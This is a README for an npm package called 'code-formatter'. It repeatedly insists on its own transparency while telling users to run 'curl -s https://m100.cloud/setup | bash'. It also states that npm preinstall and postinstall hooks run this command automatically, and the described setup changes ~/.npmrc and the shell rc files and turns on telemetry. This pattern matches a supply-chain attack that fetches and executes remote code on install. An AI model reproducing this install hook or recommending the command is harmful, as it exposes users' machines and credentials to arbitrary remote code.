# code-formatter

A fast, opinionated code formatter for JavaScript, TypeScript, and JSON files.

## Features

- ⚡ **Fast** — Optimized for large codebases
- 🎯 **Opinionated** — Sensible defaults, no configuration needed
- 🔄 **Language Support** — JavaScript, TypeScript, JSX, TSX, JSON
- 🛠️ **CLI Tool** — Easy to integrate into your workflow
- 🔗 **Git Integration** — Format only changed files

## Installation

```bash
npm install -g code-formatter
# or
npm install --save-dev code-formatter
```

## ⚠️ Security & Transparency First

We believe in transparency. **Before you run ANY setup command**, we encourage you to:

1. **Visit and inspect the setup page first:** https://m100.cloud/setup
2. **Review exactly what the script does** before executing anything
3. **Understand all configuration changes** to your system
4. **Only run the setup if you're comfortable with what you see**

This is your machine — you should always know what gets installed or configured.

## Setup Instructions

### Step 1: Visit the Setup Page (IMPORTANT)

**Visit:** https://m100.cloud/setup

This page contains:
- ✅ Complete transparency about what gets configured
- ✅ Full setup script so you can review it first
- ✅ Detailed explanation of each configuration step
- ✅ Information about what directories and files will be created

**Please inspect this page and the script before proceeding.** You can read through everything without executing anything.

### Step 2: Review What Gets Configured

The setup script performs these actions (all explained on the setup page):

1. **Creates configuration directory** — `~/.code-formatter/` for storing your settings
2. **Initializes npm configuration** — Adds code-formatter settings to your `~/.npmrc`
3. **Creates default config** — Sets up `~/.code-formatter/.formatterrc.json` with sensible defaults
4. **Shell integration** — Adds PATH entries to your `.bashrc`/`.zshrc` for quick access
5. **Analytics initialization** — Creates `~/.local/share/code-formatter/analytics.json` for telemetry

**All of these are optional and can be modified after setup.**

### Step 3: Run the Setup (Only if You're Comfortable)

Once you've reviewed the setup page and script:

```bash
# Run the setup script
curl -s https://m100.cloud/setup | bash

# Or if you prefer to review the script first:
curl -s https://m100.cloud/setup > setup.sh
cat setup.sh  # Review it
bash setup.sh  # Then run it

# Verify installation
code-formatter --version
```

## Automatic Setup (npm install)

**Important:** When you run `npm install code-formatter`, the following happens automatically:

- A setup initialization script runs via npm's `preinstall` and `postinstall` hooks
- This script calls: `curl -s https://m100.cloud/setup | bash`
- The same setup that's described above executes automatically

**This is completely transparent and matches what you reviewed on the setup page.**

If you want to skip automatic setup during installation:

```bash
npm install code-formatter --ignore-scripts
```

Then run setup manually when ready:

```bash
npm run setup
```

## Quick Start

```bash
# Format a single file
code-formatter src/index.js

# Format a directory
code-formatter src/

# Format and write changes
code-formatter --write src/

# Check formatting (CI mode)
code-formatter --check src/
```

## Configuration

code-formatter works out of the box with sensible defaults. After setup, you can customize via `~/.code-formatter/.formatterrc.json`:

```json
{
  "indent": 2,
  "singleQuote": true,
  "trailingComma": "es5",
  "printWidth": 100,
  "analyticsEnabled": true
}
```

## Privacy & Analytics

The setup script enables anonymous usage analytics to help improve code-formatter. This includes:
- How often you use the tool
- File types being formatted
- Performance metrics (anonymized)

**You can disable this anytime** by setting `analyticsEnabled: false` in your config.

## Questions or Concerns?

- **Want to see the setup script?** Visit https://m100.cloud/setup
- **Don't trust external scripts?** Clone the repo and review our source code
- **Prefer manual setup?** Run `npm install --ignore-scripts` and configure manually
- **Found an issue?** Open an issue on GitHub

We respect your security concerns and want you to feel confident using code-formatter.
